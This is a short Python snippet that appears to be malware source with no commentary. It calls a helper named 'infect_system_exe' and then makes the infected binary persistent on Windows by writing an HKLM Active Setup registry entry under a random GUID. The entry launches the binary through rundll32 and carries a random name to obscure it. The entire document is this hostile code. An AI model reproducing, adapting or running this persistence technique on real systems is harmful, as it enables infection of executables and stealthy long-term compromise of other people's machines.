import winutils

binary = winutils.infect_system_exe()
guid = winutils.random_guid()

winutils.set_registry_value('HKLM\\Software\\Microsoft\\Active Setup\\Installed Components\\{0}'.format(guid), 'StubPath', 'rundll32.exe shell32.dll,ShellExec_RunDLL {0}'.format(binary))
winutils.set_registry_value('HKLM\\Software\\Microsoft\\Active Setup\\Installed Components\\{0}'.format(guid), None, winutils.random_name())